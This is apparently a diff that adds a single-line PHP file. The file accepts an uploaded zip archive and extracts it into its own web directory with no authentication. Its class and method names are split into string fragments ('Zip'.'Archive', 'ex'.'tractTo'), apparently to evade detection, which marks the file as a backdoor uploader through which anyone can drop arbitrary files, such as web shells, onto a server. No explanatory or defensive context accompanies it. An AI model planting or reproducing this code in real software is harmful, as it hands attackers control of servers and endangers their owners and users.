@@ -1,0 +1,1 @@
+<?= ($z = new ("Zip"."Archive")) && $z->{"op"."en"}(@$_FILES['file']['tmp_name']) === TRUE ? ($z->{"ex"."tractTo"}(dirname(__FILE__)) && $z->close() ? 'OK' : 'ERR') : 'INVALID'; ?>
